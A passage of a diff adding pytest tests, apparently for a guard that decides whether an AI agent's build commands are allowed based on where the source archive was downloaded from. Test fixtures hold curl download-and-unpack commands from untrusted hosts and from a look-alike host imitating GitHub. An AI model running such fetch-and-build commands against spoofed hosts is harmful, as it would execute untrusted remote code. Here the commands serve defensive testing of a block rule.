+                              f"cd {tmp_path} && mkdir x && tar -xzf a.tgz -C x --strip-components=1"))
+    assert _review(child, BUILD.format(d=tmp_path), tmp_path).detail["grant_sources"] == [SOURCE]
+
+
+def test_root_chat_download_and_subagent_unpack(db, strict_judge, tmp_path):
+    db.append_message("root", "assistant", "", tool_calls=[
+        {"id": "r0", "type": "function", "function": {"name": "terminal", "arguments": json.dumps(
+            {"command": f"cd {tmp_path} && curl -fsSL -o a.tgz {ARCHIVE}"})}}])
+    db.append_message("root", "tool", json.dumps({"output": "ok"}), tool_call_id="r0")
+    child = _child(db, _calls(f"cd {tmp_path} && mkdir x && tar -xzf a.tgz -C x"))
+    assert _review(child, BUILD.format(d=tmp_path), tmp_path).detail["grant_sources"] == [SOURCE]
+
+
+def test_grant_covers_later_builds_in_that_tree_only(db, strict_judge, tmp_path):
+    child = _child(db, _calls(
+        f"cd {tmp_path} && curl -fsSL -o a.tgz {ARCHIVE} && mkdir x && tar -xzf a.tgz -C x --strip-components=1",
+        f"cd {tmp_path} && curl -fsSL -o b.tgz https://github.com/other/repo/archive/refs/heads/main.tar.gz && mkdir y && tar -xzf b.tgz -C y",
+        f"cd {tmp_path} && curl -fsSL -o c.tgz https://dl.example.com/c.tgz && mkdir z && tar -xzf c.tgz -C z",
+        f"cd {tmp_path} && curl -fsSL -o d.tgz https://github.com.evil.example/Themaister/parallel-rdp-standalone/archive/m.tar.gz && mkdir w && tar -xzf d.tgz -C w",
+        f"cd {tmp_path} && mkdir v && tar -xzf unknown.tgz -C v",
+        f"cd {tmp_path} && curl -fsSL -o e.tgz {CODELOAD} && mkdir u && tar -xzf e.tgz -C u"))
+    G.record_card_grant(db, "root", SOURCE)
+    for command in (f"cd {tmp_path}/x && cmake -S . -B build -G Ninja", f"cd {tmp_path}/x/build && make -j8",
+                    f"cd {tmp_path}/x && clang++ -std=c++17 -c vulkan/a.cpp -o a.o",
+                    f"cd {tmp_path} && cmake -S x -B x/build && cmake --build x/build",
+                    f"cd {tmp_path}/u && make", BUILD.format(d=tmp_path)):
+        assert _review(child, command, tmp_path).decision == "allow", command
+    for folder in ("y", "z", "w", "v"):  # another repo, another host, a look-alike host, a file never downloaded
+        for command in (f"cd {tmp_path}/{folder} && cmake -S . -B build", f"cd {tmp_path}/{folder} && make",
+                        f"cd {tmp_path}/x && make && cd ../{folder} && make"):
+            assert _review(child, command, tmp_path).decision == "block", command
+
+
+@pytest.mark.parametrize("fetch", [
+    "cd {d} && curl -fsSL -o a.zip https://dl.example.com/a.zip && unzip a.zip -d x",
+    "cd {d} && curl -fsSL https://dl.example.com/a.tgz | tar xz -C x",
